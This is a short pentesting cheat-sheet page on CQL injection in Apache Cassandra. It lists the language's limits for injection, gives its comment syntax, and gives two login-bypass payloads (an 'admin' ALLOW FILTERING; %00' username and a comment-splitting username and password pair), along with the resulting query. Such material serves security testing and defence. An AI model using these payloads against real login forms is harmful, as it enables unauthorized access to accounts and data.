# Cassandra Injection

> Apache Cassandra is a free and open-source distributed wide column store NoSQL database management system.


## Summary

* [CQL Injection Limitations](#cql-injection-limitations)
* [Cassandra Comment](#cassandra-comment)
* [Cassandra Login Bypass](#cassandra-login-bypass)
    * [Example #1](#example-1)
    * [Example #2](#example-2)
* [References](#references) 


## CQL Injection Limitations

* Cassandra is a non-relational database, so CQL doesn't support `JOIN` or `UNION` statements, which makes cross-table queries more challenging. 

* Additionally, Cassandra lacks convenient built-in functions like `DATABASE()` or `USER()` for retrieving database metadata. 

* Another limitation is the absence of the `OR` operator in CQL, which prevents creating always-true conditions; for instance, a query like `SELECT * FROM table WHERE col1='a' OR col2='b';` will be rejected. 

* Time-based SQL injections, which typically rely on functions like `SLEEP()` to introduce a delay, are also difficult to execute in CQL since it doesn’t include a `SLEEP()` function.

* CQL does not allow subqueries or other nested statements, so a query like `SELECT * FROM table WHERE column=(SELECT column FROM table LIMIT 1);` would be rejected. 


## Cassandra Comment

```sql
/* Cassandra Comment */
```


## Cassandra Login Bypass

### Example #1

```sql
username: admin' ALLOW FILTERING; %00
password: ANY
```

### Example #2

```sql
username: admin'/*
password: */and pass>'
```

The injection would look like the following SQL query

```sql
SELECT * FROM users WHERE user = 'admin'/*' AND pass = '*/and pass>'' ALLOW FILTERING;
```


## References

- [Cassandra injection vulnerability triggered - DATADOG - January 30, 2023](https://docs.datadoghq.com/fr/security/default_rules/appsec-cass-injection-vulnerability-trigger/)
- [Investigating CQL injection in Apache Cassandra - Mehmet Leblebici - December 2, 2022](https://www.invicti.com/blog/web-security/investigating-cql-injection-apache-cassandra/)